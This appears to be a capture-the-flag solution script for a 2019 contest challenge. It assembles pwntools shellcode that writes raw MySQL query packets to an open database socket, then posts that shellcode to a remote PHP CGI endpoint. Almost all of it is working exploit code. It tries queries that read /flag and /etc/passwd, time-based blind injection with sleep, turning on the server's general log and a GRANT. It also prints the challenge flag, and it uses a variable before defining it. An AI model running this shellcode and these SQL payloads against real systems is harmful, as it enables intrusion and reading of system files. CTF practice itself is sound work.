#!/usr/bin/env python
from pwn import *
from requests import *

'''
OOO{WaTCH ouT FoR THaT ReTuRN TRiP}
'''

context.arch = 'amd64'
URL = 'http://shellretql.quals2019.oooverflow.io:9090/cgi-bin/index.php'


cmd = "SELECT IF ( substring( ( select load_file(\'/flag\' ) , 1 , 1 ) ) = \'O\', sleep(10), 'false' )"
#cmd = 'select load_file(\'/etc/passwd\');'
cmd = 'select load_file(\'/flag\' )'
cmd = 'SET global general_log=\'on\';'
cmd = 'select 123'
cmd = 'SELECT @@global.secure_file_priv;'
#cmd = 'GRANT USAGE ON *.* TO \'shellql\'@\'%\''
cmd = 'SELECT LOAD DATA LOCAL INFILE \"/flag\"'
cmd = 'select * from information_schema.processlist;'

query = '\x03' + cmd
query = p32( len( p ) ) + query

p = asm(
    shellcraft.echo('\n', 1) +
    shellcraft.pushstr( query ) +
    shellcraft.write( 4 , 'rsp', len( query ) ) +
    shellcraft.read( 4 , 'rsp' , 0x10000 ) + 
    shellcraft.write( 1 , 'rsp' , 'rax' )
)

r = post( URL , data = { 'shell': p } )

print r.content[13:]
print r.content